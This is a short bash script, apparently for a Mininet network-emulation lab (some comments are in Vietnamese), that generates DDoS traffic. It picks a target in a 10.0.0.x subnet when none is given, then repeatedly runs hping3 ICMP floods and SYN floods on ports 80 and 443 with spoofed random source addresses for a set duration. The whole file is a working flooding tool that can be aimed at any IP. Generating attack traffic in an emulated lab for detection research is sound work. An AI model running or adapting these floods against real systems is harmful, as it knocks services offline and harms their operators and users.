#!/bin/bash
# Generic DDoS traffic generator for Mininet hosts

TARGET_IP=${1:-""}
BOT_ID=${2:-"ddos-node"}
DURATION=${3:-120} # seconds
SUBNET_PREFIX=${SUBNET_PREFIX:-"10.0.0"}  # phù hợp topo MultiSwitch h1-h12
MIN_HOST=${MIN_HOST:-1}
MAX_HOST=${MAX_HOST:-12}

# If no TARGET_IP provided, try to discover a target in the same /24 subnet.
if [ -z "$TARGET_IP" ]; then
    my_ip=$(hostname -I 2>/dev/null | awk '{print $1}')
    my_last=0
    [ -n "$my_ip" ] && my_last=$(echo "$my_ip" | awk -F. '{print $4}')

    # Thử tìm target trong pool hợp lệ của topo
    for attempt in $(seq 1 20); do
        r=$((RANDOM % (MAX_HOST - MIN_HOST + 1) + MIN_HOST))
        [ "$r" -eq "$my_last" ] && continue
        cand="${SUBNET_PREFIX}.${r}"
            ping -c1 -W1 "$cand" >/dev/null 2>&1 && TARGET_IP="$cand" && break
        done

    # Fallback: chọn một host khác trong pool
        if [ -z "$TARGET_IP" ]; then
            while true; do
            r=$((RANDOM % (MAX_HOST - MIN_HOST + 1) + MIN_HOST))
            [ "$r" -ne "$my_last" ] && TARGET_IP="${SUBNET_PREFIX}.${r}" && break
            done
    fi
fi

echo "[DDoS] Bot ${BOT_ID} targeting ${TARGET_IP} for ${DURATION}s"

end_time=$((SECONDS + DURATION))
iteration=0

while [ $SECONDS -lt $end_time ]; do
    iteration=$((iteration + 1))
    echo "[DDoS] ${BOT_ID} iteration ${iteration}"

    # Light ping to keep ARP/cache active
    ping -c1 -W1 "${TARGET_IP}" >/dev/null 2>&1

    # ICMP flood bursts with random source IPs
    for rate in 10000 15000 20000 25000 30000 35000; do
        hping3 -1 --rand-source -i u${rate} -c 400 "${TARGET_IP}" >/dev/null 2>&1
    done

    # Mixed SYN flood packets
    for rate in 40000 45000 50000; do
        hping3 --rand-source -S -p 80 -i u${rate} -c 300 "${TARGET_IP}" >/dev/null 2>&1
        hping3 --rand-source -S -p 443 -i u${rate} -c 300 "${TARGET_IP}" >/dev/null 2>&1
    done

    # Short pause to simulate bursty DDoS
    sleep 1
done

echo "[DDoS] Bot ${BOT_ID} finished"
